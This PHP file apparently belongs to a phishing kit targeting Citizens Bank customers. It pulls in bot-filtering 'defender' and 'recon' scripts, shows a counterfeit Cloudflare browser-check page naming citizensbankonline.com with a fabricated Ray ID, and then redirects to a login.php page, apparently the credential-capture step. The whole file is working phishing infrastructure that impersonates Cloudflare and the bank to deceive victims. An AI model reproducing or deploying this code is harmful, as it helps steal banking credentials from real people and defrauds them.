<?php
require 'KU5H/defender1.php';
require 'KU5H/defender2.php';
require 'KU5H/defender3.php';
require 'KU5H/defender4.php';
require 'KU5H/defender5.php';
require 'KU5H/defender6.php';
require 'KU5H/defender7.php';
require 'KU5H/defender8.php';
require 'KU5H/recon.php';

    session_start();
    include './settings.php';
    $token  =   md5(uniqid(microtime(), true));

    if ($CFProtection == "off") {
        
        die('<script> window.location.href = \'./login.php\'; </script>');
    }

else{

echo('<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Just a moment...</title>
        <link rel="shortcut icon" href="./V1P3R/img/favicon.png" type="image/x-icon">
        <link rel="stylesheet" href="./V1P3R/css/cf.css">
        <script>setTimeout(function(){ window.location.href = \'./login.php\';}, 4000);</script>
    </head>
    <body>
        <table width="100%" height="100%" cellpadding="20">
            <tbody>
                <tr>
                    <td valign="middle" align="center">
                        <div class="cf-browser-verification cf-im-under-attack">
                            <noscript>
                                <h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1>
                                
                                <style>
                                
                                #cf-content {
                                    display: none !important;
                                }

                                </style>
                            </noscript>
                            <div id="cf-content" style="display: block;">
                                <div id="cf-bubbles">
                                <div class="bubbles"></div>
                                <div class="bubbles"></div>
                                <div class="bubbles"></div>
                                </div>
                                <h1>
                                    <span data-translate="checking_browser">Checking your browser before accessing</span> citizensbankonline.com.
                                </h1>
                                <div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none">
                                    <p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p>
                                </div>
                                <p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your
                                requested content shortly.</p>
                                <p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs">Please allow up to 5 seconds…</p>
                                <p data-translate="redirecting" id="cf-spinner-redirecting" style="display:none">Redirecting…</p>
                            </div>
                        </div>
                        <div class="attribution">
                            DDoS protection by <a style="cursor: pointer;">Cloudflare</a>
                            <br>
                            <span class="ray_id">Ray ID: <code><?php echo uniqid();  ?></code></span>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>
    </body>
    
</html>');
                            };
?>